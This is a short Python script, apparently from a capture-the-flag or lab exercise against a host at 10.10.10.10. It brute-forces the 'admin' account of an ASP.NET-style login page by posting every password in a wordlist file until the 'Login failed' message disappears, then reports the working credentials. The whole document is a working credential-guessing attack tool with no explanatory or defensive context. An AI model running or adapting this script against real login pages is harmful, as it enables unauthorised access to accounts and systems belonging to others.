#!/usr/bin/env python3

import requests
import time

username = 'admin'
url = 'http://10.10.10.10/Account/login.aspx'

headers = {
    #'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    #'Connection': 'keep-alive',
}

file = open('passwords.txt', encoding='utf-8', errors='ignore')
data = file.read()
lines = data.split('\n')

passwords = [ x.strip() for x in lines if x ]

params = (
    ('ReturnURL', '/admin/'),
)

for password in passwords:

    data = {
        'userName': username,
        'password': password,
    }

    print(f"Trying: {username}:{password}")

    response = requests.post(url, headers=headers, params=params, data=data)

    if "Login failed" in response.text:
        print(f"FAIL: {username}:{password}")
    else:
        print(f"RESPONSE: {response}")
        print(f"SUCCESS: {username}:{password}")
        exit()

    time.sleep(1)
